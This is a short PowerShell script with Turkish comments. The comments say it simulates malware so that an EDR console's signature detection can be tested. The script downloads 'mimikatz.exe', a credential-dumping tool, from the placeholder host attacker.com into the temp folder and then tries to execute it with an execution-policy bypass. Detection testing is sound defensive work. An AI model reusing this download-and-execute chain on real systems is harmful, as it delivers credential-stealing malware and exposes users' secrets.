# EDR Test Zararlı Yazılım Simulasyonu
# Bu dosya sadece EDR kontrol panelindeki virüs tarayıcısının imza algılama özelliğini test etmek amacıyla yazılmıştır.
$path = "$env:temp\mimi.exe"
(New-Object Net.WebClient).DownloadFile('http://attacker.com/mimikatz.exe', $path)
iex $path -ExecutionPolicy Bypass
